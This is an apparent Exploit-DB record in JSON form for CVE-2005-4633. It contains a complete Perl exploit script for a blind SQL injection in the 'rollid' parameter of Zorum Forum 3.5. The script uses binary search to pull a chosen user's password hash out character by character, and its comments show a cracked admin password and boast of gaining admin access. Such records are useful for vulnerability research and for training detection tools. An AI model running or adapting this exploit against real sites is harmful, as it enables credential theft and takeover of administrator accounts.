{
  "id": "1509",
  "title": "Zorum Forum 3.5 - &#039;rollid&#039; SQL Injection",
  "cve": "CVE-2005-4633",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse LWP::UserAgent;\r\n\r\n# -------------------------------------------------------------------------------------------\r\n# Zorum forum (http://zorum.phpoutsourcing.com/) version 3.5 sql injection exploit\r\n# by 1dt.w0lf // RusH security team\r\n# *** work on all mysql versions\r\n# -------------------------------------------------------------------------------------------\r\n# Usage: r57zor.pl [path] [rollid] [username] \r\n# [path]     - path to forum\r\n# [rollid]   - forum number where user create topic\r\n# [username] - username for bruteforce\r\n# -------------------------------------------------------------------------------------------\r\n# screen:\r\n# r57zor.pl http://zorum.phpoutsourcing.com/forum/ 4 admin\r\n#  Please wait...\r\n#  [################]\r\n#\r\n#  USER_NAME: admin\r\n#  USER_PASS: 32b3956b2024e0fc\r\n# -------------------------------------------------------------------------------------------  \r\n# well it's just default sql crypting...\r\n#  mysql_crk.exe 32b3956b2024e0fc\r\n#  Hash: 32b3956b2024e0fc\r\n#  Trying length 3\r\n#  Trying length 4\r\n#  Trying length 5\r\n#  Trying length 6\r\n#  Found pass: habzsi\r\n# jabi-dabi-duuuu ... we are admins now... =)\r\n# -------------------------------------------------------------------------------------------\r\n# greets 2: GHC.ru , gst.void.ru\r\n# -------------------------------------------------------------------------------------------\r\n# 01.03.05\r\n\r\n\r\n$path     = $ARGV[0];\r\n$rollid   = $ARGV[1];\r\n$username = $ARGV[2];\r\n\r\n$s_num = 1;\r\n$|++;\r\n\r\nif (@ARGV < 2) { &usage; }\r\nprint \" Please wait...\\r\\n\";\r\nprint \" [\";\r\n\r\n### quotes must die =)\r\n($uusername = $username) =~ s/(.)/sprintf(\"%d,\",ord($1))/eg;\r\n$uusername =~ s/(.*),$/$1/;\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,122); } \r\n$char = $i;\r\nif ($char==\"0\") \r\n { \r\n print qq{] \r\n \r\n USER_NAME: $username\r\n USER_PASS: $allchar\r\n };\r\n exit(); \r\n }\r\nelse \r\n { \r\n print \"#\"; \r\n $allchar .= chr($char); \r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \" BETWEEN $r AND $fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n $ccheck = $_[0];\r\n $http_query = $path.\"index.php?method=showhtmllist&list=topic&rollid=\".$rollid.\" AND u.name=char(\".$uusername.\") AND ascii(substring(u.password,\".$s_num.\",1))\".$ccheck.\" /*\";\r\n $mcb_reguest = LWP::UserAgent->new() or die;\r\n $res = $mcb_reguest->post($http_query); \r\n @results = $res->content; \r\n \r\n #print \" HTTP QUERY : $http_query \\r\\n\";\r\n \r\n foreach $result(@results)\r\n  {\r\n  if ($result =~ /details/) { return 1; }\r\n  }\r\n return 0;\r\n }\r\n \r\n\r\nsub usage()\r\n {\r\n print q( \r\n+-------------* Zorum sql injection exploit *--------------+\r\n|                  r57 private stuff !!!                   |\r\n|                   http://rst.void.ru                     |\r\n|---* USAGE *----------------------------------------------|\r\n| r57zor.pl [path] [rollid] [username]                     |\r\n+--------------* view sources for more info *--------------+\r\n );\r\n exit();\r\n }\r\n\r\n# milw0rm.com [2006-02-17]",
  "url": "https://www.exploit-db.com/exploits/1509"
}